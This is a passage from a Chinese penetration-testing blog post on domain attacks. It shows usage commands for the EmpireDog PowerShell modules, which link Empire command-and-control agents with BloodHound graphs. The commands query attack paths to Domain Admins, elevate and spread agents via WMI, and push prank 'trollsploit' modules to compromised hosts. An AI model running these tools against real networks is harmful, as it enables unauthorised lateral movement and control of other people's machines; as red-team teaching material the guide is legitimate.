View Strike Details</span></span><br><span class="line">Strike ?</span><br><span class="line"><span class="comment"># Strike</span></span><br><span class="line">Strike</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple Targets</span></span><br><span class="line"><span class="comment"># Change wallpaper to all agents in selected session</span></span><br><span class="line">Session <span class="number">0</span></span><br><span class="line">Module (ModuleSearch wallpaper).name</span><br><span class="line">Option LocalImagePath <span class="string">'/root/Pictures/wallpapers/wllppr.jpg'</span></span><br><span class="line">Agent * | StrikeX</span><br><span class="line"><span class="comment">## RTFM</span></span><br><span class="line"><span class="comment"># More Stuff...</span></span><br><span class="line"><span class="built_in">Get-command</span> -Module EmpireStrike2.<span class="number">0</span> | <span class="built_in">Get-Help</span> | select Name,Synopsis</span><br><span class="line"><span class="comment"># Examples</span></span><br><span class="line"><span class="built_in">Get-Help</span> &lt;CommandName&gt; -Examples</span><br></pre></td></tr></table></figure>
<p><a href="https://www.youtube.com/watch?v=eok_NgFOnmc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=eok_NgFOnmc</a></p>
<h4 id="第二部-与BloodHound-API交互"><a href="#第二部-与BloodHound-API交互" class="headerlink" title="第二部- 与BloodHound API交互"></a><strong>第二部- 与BloodHound API交互</strong></h4><h5 id="CypherDog"><a href="#CypherDog" class="headerlink" title="CypherDog"></a><strong>CypherDog</strong></h5><p>CypherDog是一个用于将Cypher查询发送到BloodHound API的模块。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Import Module</span><br><span class="line">Import-Module CypherDog1.3</span><br><span class="line"><span class="meta">#</span> Query Node</span><br><span class="line">Node -User ACHAVARIN@EXTERNAL.LOCAL</span><br><span class="line">NodeSearch -Computer Secret</span><br><span class="line"><span class="meta">#</span> Query Edge</span><br><span class="line">Edge -MemberOfGroup CONTRACTINGI@INTERNAL.LOCAL -Return Users</span><br><span class="line">Edge -MemberOfGroup CONTRACTINGI@INTERNAL.LOCAL -Return Users -Degree *</span><br><span class="line"><span class="meta">#</span> Pipeline Combo</span><br><span class="line">Edge -AdminToComputer APOLLO.EXTERNAL.LOCAL -Return Groups |</span><br><span class="line">Edge -MemberOfGroup -Return Users | measure</span><br><span class="line">Edge -AdminToComputer APOLLO.EXTERNAL.LOCAL -Return Groups |</span><br><span class="line">Edge -MemberOfGroup -Return Users -degree * | measure</span><br><span class="line"><span class="meta">#</span> Query Edge Reverse</span><br><span class="line">EdgeR -ParentOfUser ACHAVARIN@EXTERNAL.LOCAL -Return Groups</span><br><span class="line"><span class="meta">#</span> Query Path</span><br><span class="line">Path -UserToGroup -From ACHAVARIN@EXTERNAL.LOCAL -To `</span><br><span class="line">'DOMAIN ADMINS@INTERNAL.LOCAL'</span><br><span class="line"><span class="meta">#</span># RTFM &gt;&gt; Create/Delete/Update Nodes/Edges</span><br><span class="line"><span class="meta">#</span> List all Module Commands</span><br><span class="line">Get-command -Module CypherDog1.3 | Get-Help | Select Name,Synopsis</span><br><span class="line"><span class="meta">#</span> Get Help for specific command</span><br><span class="line">Get-Help &lt;CommandName&gt; -full</span><br></pre></td></tr></table></figure>
<p>视频</p>
<p><a href="https://www.youtube.com/watch?v=SPgkgeOY40Y" target="_blank" rel="noopener">https://www.youtube.com/watch?v=SPgkgeOY40Y</a></p>
<h4 id="第三部-联动BloodHound和Empire"><a href="#第三部-联动BloodHound和Empire" class="headerlink" title="第三部 联动BloodHound和Empire"></a><strong>第三部 联动BloodHound和Empire</strong></h4><h5 id="DogStrike"><a href="#DogStrike" class="headerlink" title="DogStrike"></a><strong>DogStrike</strong></h5><p>DogStrike是一系列用于协调的cmdlet</p>
<p>BloodHound / Empire，使用PowerEmpire / EmpireStrike / CypherDog的cmdlet。</p>
<p>还包括自定义密码查询，以将帝国图形化为BloodHound中的节点。</p>
<p>特征</p>
<ul>
<li>自动映射帝国和图表+循环更新显示</li>
<li>自动提升/生成/传播代理</li>
<li>自动清洁会话/图表（陈旧）</li>
</ul>
<p>- <strong>DIY框架</strong></p>
<p>使用PowerShell作为攻击性自动化框架……</p>
<p>命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Import Module (Also Imports EmpireStrike/PowerEmpire/CypherDog)</span><br><span class="line">Import-Module DogStrike2.13</span><br><span class="line"><span class="meta">#</span> List all commands</span><br><span class="line">gcm -Mod DogStrike2.13 | Get-Help | Select Name,Synopsis</span><br><span class="line">Name Synopsis</span><br><span class="line">---- --------</span><br><span class="line">Invoke-DogBark Add Speech to automations</span><br><span class="line">Invoke-DogBite Return Listener &amp; Session for input Agent</span><br><span class="line">Invoke-DogClock Check Agent last checkin time</span><br><span class="line">Invoke-DogElevate Elevate Agent via empire module</span><br><span class="line">Invoke-DogFetch Bulk Add Properties to Nodes</span><br><span class="line">Invoke-DogMap Map Empire Nodes in BloodHound Graph</span><br><span class="line">Invoke-DogPass Pass Agent to another Server/listener</span><br><span class="line">Invoke-DogSearch Search Empire Nodes only</span><br><span class="line">Invoke-DogSpawn Spawn agent via empire module</span><br><span class="line">Invoke-DogSpread Spread agent via WMI</span><br><span class="line">Invoke-DogWatch Map/Update Empire Agents (loopable)</span><br><span class="line">Invoke-DogWipe Remove Stale Agents/Nodes</span><br><span class="line"><span class="meta">#</span> Help for Specific Command</span><br><span class="line">Get-Help &lt;CommandName&gt; -full</span><br></pre></td></tr></table></figure>
<p>视频</p>
<p><a href="https://www.youtube.com/watch?v=IcbCYy7IiNE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=IcbCYy7IiNE</a></p>
<p><a href="https://www.youtube.com/watch?v=bDm1zR2W4w0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bDm1zR2W4w0</a></p>
<p><a href="https://www.youtube.com/watch?v=a4EtEY37ImQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=a4EtEY37ImQ</a></p>
<p>注意</p>
<p>导入DogStrike还会导入PowerEmpire + EmpireStrike和CypherDog。</p>
<p><strong>附录</strong></p>
<p>Dummy DIY Cmdlet - 多个目标的模块组合</p>
<p>CMDLET</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## CMDLET</span></span><br><span class="line"><span class="comment">&lt;# SHOW ME WHAT YOU GOT! #&gt;</span></span><br><span class="line"><span class="keyword">Function</span> Invoke-ShowMeWhatYouGot&#123;</span><br><span class="line"> [CmdletBinding()]</span><br><span class="line"> [Alias(<span class="string">'ShowMeWhatYouGot'</span>)]</span><br><span class="line"> <span class="keyword">Param</span>(</span><br><span class="line"> <span class="comment"># Agent Name (Accepts multiple &amp; Pipeline)</span></span><br><span class="line"> [parameter(Mandatory=<span class="literal">$true</span>,ValueFromPipeline=<span class="literal">$True</span>)][String[]]<span class="variable">$Agent</span>,</span><br><span class="line"> <span class="comment"># Path to Wallpaper (on Empire Server)</span></span><br><span class="line"> [Parameter(Mandatory=<span class="literal">$true</span>)][Alias(<span class="string">'Image'</span>)][String]<span class="variable">$ImagePath</span>,</span><br><span class="line"> <span class="comment"># Video URL (if other than Get-Schwifty)</span></span><br><span class="line"> [Parameter(Mandatory=<span class="literal">$false</span>)][String]<span class="variable">$VideoURL</span></span><br><span class="line"> )</span><br><span class="line"> <span class="keyword">Begin</span>&#123;&#125;</span><br><span class="line"> <span class="keyword">Process</span>&#123;</span><br><span class="line"> <span class="keyword">Foreach</span>(<span class="variable">$Agt</span> <span class="keyword">in</span> <span class="variable">$Agent</span>)&#123;</span><br><span class="line"> <span class="comment"># Set Target Agent</span></span><br><span class="line"> DogBite -Agent <span class="variable">$Agt</span> -Select</span><br><span class="line"> <span class="comment"># trollsploit/wallpaper</span></span><br><span class="line"> Module powershell/trollsploit/wallpaper</span><br><span class="line"> Option LocalImagePath <span class="variable">$ImagePath</span></span><br><span class="line"> Strike -Agent <span class="variable">$Agt</span> -Blind</span><br><span class="line"> <span class="comment"># trollsploit/get-swchifty</span></span><br><span class="line"> Module powershell/trollsploit/get_schwifty</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$VideoURL</span>)&#123;Option VideoURL <span class="variable">$VideoURL</span>&#125;</span><br><span class="line"> Strike -Agent <span class="variable">$Agt</span> -Blind</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">End</span>&#123;</span><br><span class="line"> <span class="comment"># Quote the Giant Head</span></span><br><span class="line"> DogBark <span class="string">"I Like what You Got... Good Job."</span> -Rate -<span class="number">3</span> -Async</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">## ACTION (All Agent Nodes)</span></span><br><span class="line"><span class="comment"># Shumshumschilpiddydah!</span></span><br><span class="line"><span class="variable">$Schwifty</span> = <span class="string">'/root/Pictures/wallpapers/Get-Schwifty.png'</span></span><br><span class="line">DogSearch -Agent | ShowMeWhatYouGot -Image <span class="variable">$Schwifty</span></span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
<p><a href="https://github.com/EmpireProject" target="_blank" rel="noopener">https://github.com/EmpireProject</a></p>
<p><a href="https://github.com/EmpireProject/Empire/wiki" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/wiki</a></p>
<p><a href="https://adaptiveempire.slack.com" target="_blank" rel="noopener">https://adaptiveempire.slack.com</a></p>
<p><a href="https://gitlab.com/carlos_perez/PowerEmpire" target="_blank" rel="noopener">https://gitlab.com/carlos_perez/PowerEmpire</a></p>
<p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p>
<p><a href="https://github.com/BloodHoundAD/BloodHound/wiki" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/wiki</a></p>
<p><a href="https://bloodhoundhq.slack.com" target="_blank" rel="noopener">https://bloodhoundhq.slack.com</a></p>
<p><a href="https://blog.cptjesus.com/posts/introtocypher" target="_blank" rel="noopener">https://blog.cptjesus.com/posts/introtocypher</a></p>
<p><a href="https://posts.specterops.io/" target="_blank" rel="noopener">https://posts.specterops.io/</a></p>
<p><a href="http://porterhau5.com/blog/" target="_blank" rel="noopener">http://porterhau5.com/blog/</a></p>
<p><a href="https://adsecurity.org/" target="_blank" rel="noopener">https://adsecurity.org/</a></p>

      
    </div>
    <footer class="article-footer">
      
      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8zNTMwOS8xMTg0NQ">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/01/21/Security management platform/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">上一篇</strong>
      <div class="article-nav-title">
        
          中小企业安全管理平台
        
      </div>
    </a>
  
  
    <a href="/2018/10/23/思维导图-内网渗透归纳总结-思维导图/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">下一篇</strong>
      <div class="article-nav-title">内网渗透归纳总结-思维导图</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="toc-sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#域渗透实战简要总结"><span class="nav-number">1.</span> <span class="nav-text">域渗透实战简要总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Empire"><span class="nav-number">1.0.1.</span> <span class="nav-text">Empire</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一篇文章精通PowerShell-Empire-2-3（上）"><span class="nav-number">1.0.1.0.1.</span> <span class="nav-text">一篇文章精通PowerShell Empire 2.3（上）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一篇文章精通PowerShell-Empire-2-3（下）"><span class="nav-number">1.0.1.0.2.</span> <span class="nav-text">一篇文章精通PowerShell Empire 2.3（下）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常用命令-直接help"><span class="nav-number">1.0.1.0.3.</span> <span class="nav-text">常用命令  直接help</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模块"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">模块</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PSattack：一个渗透测试中使用的万能框架"><span class="nav-number">1.0.2.</span> <span class="nav-text">PSattack：一个渗透测试中使用的万能框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CrackMapExec"><span class="nav-number">1.0.3.</span> <span class="nav-text">CrackMapExec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bloodhound-域攻击关系图"><span class="nav-number">1.0.4.</span> <span class="nav-text">Bloodhound  域攻击关系图</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CobaltStrke"><span class="nav-number">1.1.</span> <span class="nav-text">CobaltStrke</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#列表集合"><span class="nav-number">1.1.0.0.1.</span> <span class="nav-text">列表集合</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bean-COMMAD"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">Bean COMMAD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一些好用的脚本"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">一些好用的脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Red-Team-Persistence"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">Red Team Persistence</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kits-工具包"><span class="nav-number">1.1.0.4.</span> <span class="nav-text">Kits 工具包</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#NoPowerShell"><span class="nav-number">1.1.0.4.1.</span> <span class="nav-text">NoPowerShell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PowerView"><span class="nav-number">1.1.0.4.2.</span> <span class="nav-text">PowerView</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#BloodHound-联动插件"><span class="nav-number">1.1.0.4.3.</span> <span class="nav-text">BloodHound 联动插件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权脚本"><span class="nav-number">1.1.0.5.</span> <span class="nav-text">提权脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在不调用powershell-exe的情况下运行PowerShell命令"><span class="nav-number">1.1.0.5.1.</span> <span class="nav-text">在不调用powershell.exe的情况下运行PowerShell命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#提权"><span class="nav-number">1.1.0.5.2.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UACME-BypassUAC的总结"><span class="nav-number">1.1.0.6.</span> <span class="nav-text">UACME  BypassUAC的总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WinPwnage-Bypass-UAC、权限维持"><span class="nav-number">1.1.0.7.</span> <span class="nav-text">WinPwnage  Bypass UAC、权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#UAC绕过"><span class="nav-number">1.1.0.7.1.</span> <span class="nav-text">UAC绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#权限维持"><span class="nav-number">1.1.0.7.2.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pupy"><span class="nav-number">1.1.0.7.3.</span> <span class="nav-text">pupy</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具联动"><span class="nav-number">1.2.</span> <span class="nav-text">工具联动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些自动化工具"><span class="nav-number">1.3.</span> <span class="nav-text">一些自动化工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Death-Star-自动化工具"><span class="nav-number">1.3.1.</span> <span class="nav-text">Death Star 自动化工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EmpireDog"><span class="nav-number">1.3.2.</span> <span class="nav-text">EmpireDog</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一步-Empire-API交互"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">第一步 Empire API交互</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PowerEmpire"><span class="nav-number">1.3.2.1.1.</span> <span class="nav-text">PowerEmpire</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EmpireStrike"><span class="nav-number">1.3.2.1.2.</span> <span class="nav-text">EmpireStrike</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二部-与BloodHound-API交互"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">第二部- 与BloodHound API交互</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CypherDog"><span class="nav-number">1.3.2.2.1.</span> <span class="nav-text">CypherDog</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三部-联动BloodHound和Empire"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">第三部 联动BloodHound和Empire</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DogStrike"><span class="nav-number">1.3.2.3.1.</span> <span class="nav-text">DogStrike</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.4.</span> <span class="nav-text">参考</span></a></li></ol></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2016 - 2019 shackle All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				访客数 : <span id="busuanzi_value_site_uv"></span> |  
				访问量 : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>




  <script src="/js/dialog.js"></script>








	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261091520&web_id=1261091520" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            shackle
          </div>
          <div class="panel-body">
            Copyright © 2019 shackle All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
  
</body>
</html>